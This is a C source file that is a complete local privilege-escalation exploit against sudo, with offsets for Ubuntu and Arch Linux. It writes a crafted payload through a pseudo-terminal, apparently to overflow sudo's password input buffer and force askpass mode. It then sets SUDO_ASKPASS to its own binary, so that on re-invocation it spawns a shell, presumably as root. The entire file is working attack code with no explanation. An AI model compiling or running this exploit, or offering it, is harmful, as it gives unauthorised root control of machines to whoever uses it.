#define _GNU_SOURCE
#include <assert.h>
#include <err.h>
#include <fcntl.h>
#include <limits.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <termios.h>
#include <unistd.h>

#define TGP_ASKPASS 0x4
#define SUDO_CONV_REPL_MAX 255

#define TGP_OFFSET_ARCHLINUX 548
#define TGP_OFFSET_UBUNTU 624

#define KILL_OFFSET (SUDO_CONV_REPL_MAX - 1)
#define OVERFLOW_SIZE 1000
#define TGP_OFFSET TGP_OFFSET_UBUNTU

int main(int argc, char **argv) {
  (void)argv;

  if (argc > 1) {
    if (unsetenv("SUDO_ASKPASS") != 0) {
      warn("unsetenv(SUDO_ASKPASS)");
    }
    if (dup2(STDERR_FILENO, STDIN_FILENO) != STDIN_FILENO) {
      warn("dup2(STDERR_FILENO, STDIN_FILENO)");
    }
    if (dup2(STDERR_FILENO, STDOUT_FILENO) != STDOUT_FILENO) {
      warn("dup2(STDERR_FILENO, STDOUT_FILENO)");
    }
    execlp("sh", "sh", NULL);
    err(1, "execlp(sh)");
  }

  int ptyfd = posix_openpt(O_NOCTTY | O_RDWR);
  if (ptyfd < 0) {
    err(1, "posix_openpt");
  }
  if (grantpt(ptyfd) != 0) {
    err(1, "grantpt");
  }
  if (unlockpt(ptyfd) != 0) {
    err(1, "unlockpt");
  }

  struct termios term;
  if (tcgetattr(ptyfd, &term) != 0) {
    err(1, "tcgetattr");
  }
  cfmakeraw(&term);
  term.c_cc[VEOF] = 0xAA;
  if (tcsetattr(ptyfd, TCSANOW, &term) != 0) {
    err(1, "tcsetattr");
  }

  uint8_t sudo_term_eof = term.c_cc[VEOF];
  if (sudo_term_eof == 0) {
    errx(1, "sudo_term_eof == 0");
  } else if (sudo_term_eof == TGP_ASKPASS) {
    errx(1, "sudo_term_eof == TGP_ASKPASS");
  }

  uint8_t sudo_term_erase = term.c_cc[VERASE];
  if (sudo_term_erase == 0) {
    errx(1, "sudo_term_erase == 0");
  } else if (sudo_term_erase == TGP_ASKPASS) {
    errx(1, "sudo_term_erase == TGP_ASKPASS");
  }

  uint8_t sudo_term_kill = term.c_cc[VKILL];
  if (sudo_term_kill == 0) {
    errx(1, "sudo_term_kill == 0");
  } else if (sudo_term_kill == TGP_ASKPASS) {
    errx(1, "sudo_term_kill == TGP_ASKPASS");
  }

  const char *devpts = ptsname(ptyfd);
  if (devpts == NULL) {
    err(1, "ptsname");
  }

  int ttyfd = open(devpts, O_NOCTTY | O_RDONLY);
  if (ttyfd < 0) {
    err(1, "open(devpts)");
  }

  uint8_t payload[OVERFLOW_SIZE + 5] = {0};
  payload[KILL_OFFSET * 1] = sudo_term_kill;
  payload[KILL_OFFSET * 2] = sudo_term_kill;
  static_assert(TGP_OFFSET + 2 > KILL_OFFSET * 2);
  static_assert(TGP_OFFSET + 2 < KILL_OFFSET * 3);
  payload[TGP_OFFSET + 2] = TGP_ASKPASS;
  payload[KILL_OFFSET * 3] = sudo_term_kill;
  payload[sizeof(payload) - 2] = sudo_term_kill;
  payload[sizeof(payload) - 1] = '\n';

  if (write(ptyfd, payload, sizeof(payload)) != sizeof(payload)) {
    err(1, "write(ptyfd, payload)");
  }

  if (dup2(ttyfd, STDIN_FILENO) != STDIN_FILENO) {
    err(1, "dup2(ttyfd, STDIN_FILENO)");
  }
  if (close(ttyfd) != 0) {
    warn("close(ttyfd)");
  }

  char askpass[PATH_MAX + 1];
  ssize_t len = readlink("/proc/self/exe", askpass, sizeof(askpass) - 1);
  if (len < 0) {
    err(1, "readlink(/proc/self/exe)");
  }
  askpass[len] = '\0';

  if (setenv("SUDO_ASKPASS", askpass, true) != 0) {
    err(1, "setenv(SUDO_ASKPASS)");
  }

  execlp("sudo", "sudo", "-S", "", NULL);
  err(1, "execlp(sudo)");
}
